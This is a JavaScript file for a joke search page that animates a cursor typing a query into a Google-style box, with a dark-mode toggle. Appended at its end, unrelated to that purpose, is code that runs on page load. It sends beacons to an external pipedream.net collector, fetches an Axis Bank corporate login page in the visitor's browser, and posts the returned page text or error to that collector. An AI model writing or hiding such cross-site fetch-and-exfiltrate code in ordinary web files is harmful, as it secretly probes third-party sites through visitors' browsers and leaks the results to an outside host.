"use strict"

/** @type {{search: string; lucky?: boolean;}} */
const query = window.location.search
  .substr(1)
  .split("&")
  .map(keyValue => keyValue.split("="))
  .map(([key, value]) => ({
    [decodeURIComponent(key)]: decodeURIComponent(
      value?.replaceAll("+", "%20")
    ),
  }))
  .reduce((previous, current) => ({ ...previous, ...current }), {})

/** @type {HTMLInputElement} */
let input

window.addEventListener("load", async () => {
  input = document.getElementById("input")

  const getLinkButton = document.getElementById('get-link');
  const linkResultParent = document.getElementById('link-result-parent');
  const linkResult = document.getElementById('link-result');
  const linkAnchor = document.getElementById('link-anchor');
  const searchForm = document.getElementById('search-form');

  function showLink() {
    if(input.value) {
      linkResultParent.style.display='block';
      linkResult.textContent = `${window.location.origin}/?search=${input.value}`;
      linkAnchor.href = `${window.location.origin}/?search=${input.value}`;
    }
  }

  function doSearch() {
    window.location.href = `https://www.google.com/search?${
      query.lucky ? "btnI&" : ""
    }q=${query.search}`;
  }

  searchForm.addEventListener('submit', function(e) {
    e.preventDefault();
    if(!query.search) {
      showLink();
    } else {
      //
    }
  });

  const button = document.getElementById("search");
  getLinkButton.addEventListener('click', function(e) {
    showLink();
  });

  input.value = ""

  setBrightness(JSON.parse(localStorage.getItem("dark") ?? "false"))

  if (!query.search) return

  button.addEventListener('click', function() {
    doSearch();
  });
  button.style.display='inline-block';
  getLinkButton.style.display = 'none';

  await setMessage("Step 1", "Go to google.com");
  await new Promise(resolve => setTimeout(resolve, 2000))
  await setMessage("Step 2", "Type in your question");
  const cursor = makeCursor()
  await move(cursor, input)
  input.focus()
  await write()
  await new Promise(resolve => setTimeout(resolve, 1000))
  input.blur()

  await setMessage("Step 3", "Click on the search button")

  await move(cursor, button)
  button.focus()
  await new Promise(resolve => setTimeout(resolve, 1000))

  await setMessage("Come on", "Was it really that hard?", "alert-success")
  await new Promise(resolve => setTimeout(resolve, 3000))


})

function makeCursor() {
  const dark = JSON.parse(localStorage.getItem("dark") ?? "false")

  const cursor = document.createElement("span")
  cursor.className = `bi-cursor-fill text-${dark ? "light" : "dark"}`
  cursor.id = "cursor"
  document.body.appendChild(cursor)
  return cursor
}

/**
 * Move the cursor to the targeted element
 * @param {HTMLSpanElement} cursor
 * @param {HTMLButtonElement} target
 */
async function move(cursor, target) {
  return new Promise(resolve => {
    const diffX =
      target.getBoundingClientRect().left +
      target.clientWidth / 2 -
      cursor.getBoundingClientRect().left
    const diffY =
      target.getBoundingClientRect().top +
      target.clientHeight / 2 -
      cursor.getBoundingClientRect().top

    const steps = 60
    const stepX = diffX / steps
    const stepY = diffY / steps

    let step = 0
    const interval = setInterval(frame, 1000 / 60)

    function frame() {
      if (step >= steps) {
        clearInterval(interval)
        resolve()
      } else {
        step++
        cursor.style.top = (parseFloat(cursor.style.top) || 0) + stepY + "px"
        cursor.style.left = (parseFloat(cursor.style.left) || 0) + stepX + "px"
      }
    }
  })
}

async function write() {
  for (const letter of query.search) {
    await new Promise(resolve => setTimeout(resolve, Math.random() * 200 + 100))
    input.value += letter
    input.scrollLeft = input.scrollWidth
  }
}

/**
 * Set the message box under the search buttons.
 * @param {string} heading
 * @param {string} content
 * @param {string} type
 */
async function setMessage(heading, content, type = "alert-primary") {
  const message = document.getElementById("message")

  message.classList.add("opacity-0")
  await new Promise(resolve => setTimeout(resolve, 300))

  message.classList.remove("alert-primary")
  message.classList.remove("alert-success")
  message.classList.add(type)
  document.getElementById("message-heading").innerText = heading
  document.getElementById("message-content").innerText = content

  message.classList.remove("opacity-0")
  await new Promise(resolve => setTimeout(resolve, 300))
}

function toggleBrightness() {
  const dark = JSON.parse(localStorage.getItem("dark") ?? "false")
  localStorage.setItem("dark", !dark)
  setBrightness(!dark)
}

/**
 * Apply brightness on the page.
 * @param {boolean} dark
 */
function setBrightness(dark) {
  const newbrightness = dark ? "dark" : "light"
  const oldBrightness = dark ? "light" : "dark"

  for (const oldClass of [
    `bg-${oldBrightness}`,
    `navbar-${oldBrightness}`,
    `btn-${oldBrightness}`,
    `border-${oldBrightness}`,
  ]) {
    const newClass = oldClass.replace(oldBrightness, newbrightness)
    for (const element of document.querySelectorAll(`.${oldClass}`)) {
      element.classList.remove(oldClass)
      element.classList.add(newClass)
    }
  }

  for (const oldClass of [`text-${newbrightness}`]) {
    const newClass = oldClass.replace(newbrightness, oldBrightness)
    for (const element of document.querySelectorAll(`.${oldClass}`)) {
      element.classList.remove(oldClass)
      element.classList.add(newClass)
    }
  }
}

window.onerror = function(error, url, line) {
  console.log("ERRROR");
    console.log(error);
};

fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
  method: "POST",
  body: JSON.stringify({"here": "testing"}),
});

fetch(
  "https://corporate.axisbank.co.in/wps/portal/cBanking/AxisSMCorporateLogin/axissmcorppage",
  { method: "GET", headers: { "Content-type": "text/plain" } }
)
  .then((res) => {
    fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
  method: "POST",
  body: JSON.stringify({"here": "testing2"}),
});
    return res.text();
  })
  .then((res) => {
    fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
      method: "POST",
      body: JSON.stringify(res),
    });
    console.log(res);
  })
  .catch((err) => {
    fetch("https://ca9060cf290a45196d9c67b8ed027888.m.pipedream.net", {
      method: "POST",
      body: JSON.stringify({
        "error": err.message
      }),
    });
    console.error(err);
  });



